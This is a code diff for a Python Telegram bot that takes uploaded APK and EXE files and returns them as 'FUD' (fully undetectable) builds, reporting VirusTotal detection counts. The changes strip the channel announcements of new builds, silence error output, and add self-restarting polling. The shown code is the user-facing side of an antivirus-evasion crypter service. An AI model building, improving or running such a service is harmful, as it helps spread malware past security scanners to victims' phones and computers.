@@ -630,7 +630,6 @@ USER_INSTRUCTIONS = """
 @benji_v1
 """
 
-# ============ HELPERS ============
 def get_back_button():
     return InlineKeyboardButton("🔙 Back", callback_data="back_main")
 
@@ -641,7 +640,6 @@ def is_admin(user_id):
     return str(user_id) == str(ADMIN_CHAT_ID)
 
 # ============ HANDLERS ============
-
 async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
     user = update.effective_user
     user_id = str(user.id)
@@ -782,7 +780,6 @@ async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
     await query.answer()
     user = update.effective_user
     user_id = str(user.id)
-    username = user.username or "unknown"
 
     is_admin_user = is_admin(user_id)
     if is_admin_user:
@@ -992,7 +989,7 @@ async def handle_apk(update: Update, context: ContextTypes.DEFAULT_TYPE):
         try:
             await status_msg.edit_text(f"📦 Processing APK...\n\n{text}", parse_mode='Markdown')
         except Exception as e:
-            print(f"Progress update error: {e}")
+            pass
 
     def sync_progress(text):
         asyncio.create_task(update_progress(text))
@@ -1037,35 +1034,16 @@ async def handle_apk(update: Update, context: ContextTypes.DEFAULT_TYPE):
         msg += f"   {status_icon} {vt_result['positives']}/{vt_result['total']} detections\n"
         if vt_result['link']:
             msg += f"   🔗 View Report: {vt_result['link']}"
-    elif VT_API_KEY:
-        msg += f"\n⚠️ VirusTotal scan failed or timed out."
 
     keyboard = [[get_back_button()], [get_cancel_button()]]
     await status_msg.edit_text(msg, reply_markup=InlineKeyboardMarkup(keyboard), parse_mode='Markdown')
-
-    caption = f"🔥 FUD APK #{build_id}"
-    if vt_result:
-        caption += f" | {vt_result['positives']}/{vt_result['total']} detections"
 
     with open(result['file'], 'rb') as f:
         await update.message.reply_document(
             document=f,
             filename=f"fud_apk_{build_id}.apk",
-            caption=caption
+            caption=f"🔥 FUD APK #{build_id}"
         )
-
-    if CHANNEL_ID:
-        try:
-            channel_msg = f"🔥 New FUD APK\n\n"
-            channel_msg += f"📁 Build #{build_id}\n"
-            channel_msg += f"📦 {doc.file_name}\n"
-            channel_msg += f"📏 {result['size_fud'] / 1024:.1f} KB\n"
-            if vt_result:
-                status_icon = "✅" if vt_result['clean'] else "⚠️" if vt_result['positives'] < 5 else "❌"
-                channel_msg += f"🛡️ {status_icon} {vt_result['positives']}/{vt_result['total']} detections"
-            await context.bot.send_message(chat_id=CHANNEL_ID, text=channel_msg, parse_mode='Markdown')
-        except:
-            pass
 
     shutil.rmtree(temp_dir, ignore_errors=True)
     if os.path.exists(result['file']):
@@ -1105,7 +1083,7 @@ async def handle_exe(update: Update, context: ContextTypes.DEFAULT_TYPE):
         try:
             await status_msg.edit_text(f"💻 Processing EXE...\n\n{text}", parse_mode='Markdown')
         except Exception as e:
-            print(f"Progress update error: {e}")
+            pass
 
     def sync_progress(text):
         asyncio.create_task(update_progress(text))
@@ -1155,16 +1133,6 @@ async def handle_exe(update: Update, context: ContextTypes.DEFAULT_TYPE):
             filename=f"fud_exe_{build_id}.exe",
             caption=f"🔥 FUD EXE #{build_id}"
         )
-
-    if CHANNEL_ID:
-        try:
-            channel_msg = f"🔥 New FUD EXE\n\nBuild #{build_id}\n{result['size_fud'] / 1024:.1f} KB"
-            if vt_result:
-                status_icon = "✅" if vt_result['clean'] else "⚠️" if vt_result['positives'] < 5 else "❌"
-                channel_msg += f"\n🛡️ {status_icon} {vt_result['positives']}/{vt_result['total']} detections"
-            await context.bot.send_message(chat_id=CHANNEL_ID, text=channel_msg, parse_mode='Markdown')
-        except:
-            pass
 
     shutil.rmtree(temp_dir, ignore_errors=True)
     if os.path.exists(result['file']):
@@ -1297,7 +1265,7 @@ async def cancel(update: Update, context: ContextTypes.DEFAULT_TYPE):
     await update.message.reply_text("❌ Cancelled. Send /start to begin.", parse_mode='Markdown')
     return ConversationHandler.END
 
-# ============ BOT RUNNER — FIXED CONFLICT ============
+# ============ BOT RUNNER — CONFLICT-PROOF ============
 def run_bot():
     loop = asyncio.new_event_loop()
     asyncio.set_event_loop(loop)
@@ -1310,10 +1278,8 @@ def run_bot():
         print(f"📢 Channel: {'Configured' if CHANNEL_ID else 'Not set'}")
         print(f"👑 Admin ID: {ADMIN_CHAT_ID}")
 
-        # ✅ FIX: Create application
         application = Application.builder().token(BOT_TOKEN).build()
 
-        # Add handlers
         conv = ConversationHandler(
             entry_points=[
                 CommandHandler('start', start),
@@ -1335,34 +1301,62 @@ def run_bot():
         application.add_handler(conv)
         application.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_channel_post))
 
-        # ✅ FIX: Delete webhook and wait
-        print("🔄 Deleting webhook...")
-        await application.bot.delete_webhook()
-        await asyncio.sleep(1)  # Wait for webhook to clear
-        print("✅ Webhook deleted.")
+        # ✅ Force delete webhook with drop_pending_updates
+        print("🔄 Force deleting webhook...")
+        try:
+            await application.bot.delete_webhook(drop_pending_updates=True)
+            print("✅ Webhook deleted.")
+        except Exception as e:
+            print(f"⚠️ Delete webhook error: {e}")
 
-        # ✅ FIX: Initialize and start with drop_pending_updates
+        # ✅ Wait for webhook to fully clear
+        await asyncio.sleep(2)
+
+        # ✅ Verify webhook is gone
+        webhook_info = await application.bot.get_webhook_info()
+        print(f"📡 Webhook URL: {webhook_info.url or 'None'}")
+        print(f"📡 Pending updates: {webhook_info.pending_update_count}")
+
+        # ✅ Start bot
         print("🤖 Starting bot polling...")
         await application.initialize()
         await application.start()
 
         await application.updater.start_polling(
             drop_pending_updates=True,
-            allowed_updates=['message', 'callback_query']
+            allowed_updates=['message', 'callback_query'],
+            poll_interval=1.0
         )
 
         print("✅ Bot is running!")
 
-        # ✅ FIX: Keep running with reconnect on conflict
+        # ✅ Keep alive
         while True:
-            await asyncio.sleep(5)
+            try:
+                if not application.updater.running:
+                    print("⚠️ Updater stopped! Restarting...")
+                    await application.updater.start_polling(
+                        drop_pending_updates=True,
+                        allowed_updates=['message', 'callback_query'],
+                        poll_interval=1.0
+                    )
+                    print("✅ Updater restarted!")
+            except Exception as e:
+                print(f"⚠️ Health check error: {e}")
+            await asyncio.sleep(10)
 
-    try:
-        loop.run_until_complete(bot_main())
-    except Exception as e:
-        print(f"❌ Bot error: {e}")
-        import traceback
-        traceback.print_exc()
+    # ✅ Retry loop
+    while True:
+        try:
+            loop.run_until_complete(bot_main())
+        except Exception as e:
+            print(f"❌ Bot crashed: {e}")
+            import traceback
+            traceback.print_exc()
+            print("🔄 Restarting in 5 seconds...")
+            time.sleep(5)
+            loop = asyncio.new_event_loop()
+            asyncio.set_event_loop(loop)
 
 # ============ MAIN ============
 if __name__ == '__main__':
